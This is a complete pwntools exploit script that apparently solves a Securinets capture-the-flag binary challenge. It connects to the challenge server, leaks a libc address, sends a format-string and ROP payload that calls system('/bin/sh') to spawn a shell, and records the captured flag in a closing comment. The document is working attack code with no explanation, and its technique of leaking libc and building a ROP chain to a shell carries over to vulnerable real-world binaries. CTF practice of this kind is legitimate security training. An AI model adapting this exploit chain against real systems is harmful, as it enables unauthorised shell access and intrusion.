#!/usr/bin/python3

from pwn import *

exe = ELF('main_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x000000000040121b

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('pwn.ctf.securinets.tn', 5002)
else:
        p = process(exe.path)

GDB()
libcc = p.recvline().decode().split()
libc.address = int(libcc[3], 16) - 0x52b30
info('libc: ' + hex(libc.address))
s('%100s %100s')
payload = b'1 ' + flat(0xffffffffffffffff, 0xffffffffffffffff, libc.address + 0x0000000000027c65, next(libc.search(b'/bin/sh'))) +p64(0x0000000000401016)+ p64(libc.address + 0x4c920+3)
sl(payload)
p.interactive()
# Securinets{NoNeed_f0r_l0ve_wH3n_7ou_C1N_P0p_Sh311s}